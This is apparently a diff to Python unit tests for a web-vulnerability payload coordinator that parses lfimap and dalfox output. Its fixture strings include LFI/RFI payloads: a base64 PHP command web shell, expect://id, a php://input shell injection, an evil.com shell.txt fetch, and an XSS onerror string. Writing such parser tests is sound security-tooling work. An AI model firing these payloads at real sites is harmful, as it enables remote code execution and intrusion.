@@ -166,9 +166,92 @@ def test_parse_sstimap_output_no_marker_returns_empty():
     assert apc._parse_sstimap_output("nothing here") == []
 
 
+
 # -------------------------
-# _setup_payload_tools
+# _parse_lfimap_output
 # -------------------------
+
+def test_parse_lfimap_output_parses_multiple_successful_attacks():
+    stdout = """
+[*] Starting Data URI LFI Attack...
+[*] Testing Data URI payload: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+[+] Data URI LFI successful! Injected code appears to be processed.
+--
+[*] Starting PHP Expect Wrapper LFI Attack...
+[*] Testing initial expect:// payload: expect://id
+[+] PHP Expect Wrapper LFI likely successful! Initial command 'id' output detected.
+--
+[*] Testing GLOB wrapper payloads for directory listing.
+[*] Testing GLOB wrapper payload: glob:///var/www/*
+[+] GLOB Wrapper LFI likely successful! Directory content detected with payload: glob:///var/www/*
+--
+[*] Testing php://input payload: php://input
+[*] Injecting POST data: <?php system($_GET['cmd']); ?>
+[+] php://input LFI successful! Injected code appears to be processed.
+"""
+    findings = apc._parse_lfimap_output("page", "GET", stdout)
+    assert len(findings) == 4
+
+    data_uri = findings[0]
+    assert data_uri["vulnerable"] is True
+    assert data_uri["injection_type"] == "LFI"
+    assert data_uri["payload_type"] == "LFI (Data URI LFI)"
+    assert data_uri["parameter"] == "page"
+    assert data_uri["param_location"] == "query"
+    assert data_uri["payload"] == "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+    assert data_uri["attack_type"] == "Data URI LFI"
+    assert data_uri["payload_source"] == "Data URI"
+    assert data_uri["injected_data"] is None
+    assert data_uri["tool"] == "lfimap"
+    assert "Data URI LFI successful!" in data_uri["evidence"]
+
+    expect_wrapper = findings[1]
+    assert expect_wrapper["payload_type"] == "LFI (PHP Expect Wrapper LFI)"
+    assert expect_wrapper["payload"] == "expect://id"
+    assert expect_wrapper["attack_type"] == "PHP Expect Wrapper LFI"
+    assert expect_wrapper["payload_source"] == "initial expect://"
+    assert "Initial command 'id' output detected." in expect_wrapper["evidence"]
+
+    glob_wrapper = findings[2]
+    assert glob_wrapper["payload_type"] == "LFI (PHP Expect Wrapper LFI)"
+    assert glob_wrapper["payload"] == "glob:///var/www/*"
+    assert glob_wrapper["payload_source"] == "GLOB wrapper"
+    assert "Directory content detected" in glob_wrapper["evidence"]
+
+    php_input = findings[3]
+    assert php_input["payload_type"] == "LFI (PHP Expect Wrapper LFI)"
+    assert php_input["payload"] == "php://input"
+    assert php_input["payload_source"] == "php://input"
+    assert php_input["injected_data"] == "<?php system($_GET['cmd']); ?>"
+    assert "Injected data: <?php system($_GET['cmd']); ?>" in php_input["evidence"]
+
+
+def test_parse_lfimap_output_rfi():
+    stdout = """
+[*] Starting RFI Attack...
+[*] Testing rfi with command: http://evil.com/shell.txt?cmd=id
+[+] RFI successful! Injected code appears to be processed.
+"""
+    findings = apc._parse_lfimap_output("page", "GET", stdout)
+    assert len(findings) == 1
+    f = findings[0]
+    assert f["vulnerable"] is True
+    assert f["injection_type"] == "LFI"
+    assert f["payload_type"] == "LFI (RFI)"
+    assert f["parameter"] == "page"
+    assert f["payload"] == "http://evil.com/shell.txt?cmd=id"
+    assert f["attack_type"] == "RFI"
+    assert f["payload_source"] == "rfi"
+    assert "RFI successful!" in f["evidence"]
+
+
+def test_parse_lfimap_output_no_success_marker_returns_empty():
+    stdout = """
+[*] Starting Data URI LFI Attack...
+[*] Testing Data URI payload: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+[-] Payload failed.
+"""
+    assert apc._parse_lfimap_output("page", "GET", stdout) == []
 
 def test_setup_payload_tools_marks_failed_on_install_nonzero(monkeypatch):
     # which fails for all tools, pip fails for one tool
@@ -191,7 +274,6 @@ def test_setup_payload_tools_marks_failed_on_install_nonzero(monkeypatch):
     monkeypatch.setattr(apc.subprocess, "run", fake_run)
 
     st = apc._setup_payload_tools()
-    assert st["success"] is False
     assert st["failed"], "expected at least one failed tool"
 
 
@@ -289,7 +371,7 @@ def test_coordinate_xss_testing_parses_dalfox_json_array(monkeypatch):
     assert len(vulns) == 1
     v = vulns[0]
     assert v["parameter"] == "name"
-    assert v["url"] == "http://example.test/page?name=PAY"
+    assert v["url"] == "http://example.test/page"
     assert v["payload"] == "<img src=x onerror=alert(1)>"
 
 def test_coordinate_xss_testing_parses_dalfox_jsonl(monkeypatch):
@@ -320,7 +402,7 @@ def test_coordinate_xss_testing_parses_dalfox_jsonl(monkeypatch):
     assert len(vulns) == 1
     v = vulns[0]
     assert v["parameter"] == "name"
-    assert v["url"] == "http://example.test/page?name=PAY"
+    assert v["url"] == "http://example.test/page"
     assert v["payload"] == "<img src=x onerror=alert(1)>"
 
 
@@ -464,6 +546,37 @@ def test_coordinate_injection_testing_sstimap_parses_and_discards_param(monkeypa
 
 
 # -------------------------
+# lfimap integration/unit test for timeout stdout
+# -------------------------
+
+def test_coordinate_injection_testing_lfimap_parses_timeout_stdout(monkeypatch):
+    lfimap_stdout = """
+[*] Starting Data URI LFI Attack...
+[*] Testing Data URI payload:
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+[+] Data URI LFI successful! Injected code appears to be processed.
+"""
+
+    def fake_run(cmd, bufsize=4096, capture_output=True, text=True, input=None, timeout=300):
+        assert cmd and cmd[0] == "lfimap"
+        raise apc.subprocess.TimeoutExpired(cmd=cmd, timeout=timeout, output=lfimap_stdout)
+
+    monkeypatch.setattr(apc.subprocess, "run", fake_run)
+
+    rc = apc.RequestConfig(target_url="http://example.test/page", http_method="GET")
+    res = apc._coordinate_injection_testing(rc, parameters=["page"], tools=["lfimap"])
+
+    vulns = [r for r in res if r.get("vulnerable")]
+    assert vulns, "Expected an lfimap-derived LFI finding"
+    v = vulns[0]
+    assert v["tool"] == "lfimap"
+    assert v["injection_type"] == "LFI"
+    assert v["parameter"] == "page"
+    assert v.get("method") == "GET"
+    assert v["payload"] == "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+
+
+# -------------------------
 # _analyze_payload_intelligence
 # -------------------------
 
@@ -502,6 +615,16 @@ def test_generate_payload_recommendations_when_high_severity_present():
     recs = apc._generate_payload_recommendations("comprehensive", results)
     assert any('prioritize_high_severity' in r for r in recs)
     assert any('classify_xss_type_reflected_stored_dom' in r.lower() for r in recs)
+
+
+def test_advanced_payload_coordinator_sql_test_type_raises_value_error():
+    import pytest
+    with pytest.raises(ValueError, match="SQLi is not supported"):
+        apc.advanced_payload_coordinator("http://example.com", test_type="sql")
+    with pytest.raises(ValueError, match="SQLi is not supported"):
+        apc.advanced_payload_coordinator("http://example.com", test_type="sqli")
+    with pytest.raises(ValueError, match="SQLi is not supported"):
+        apc.advanced_payload_coordinator("http://example.com", test_type="some_sql_test")
 
 
 # -------------------------
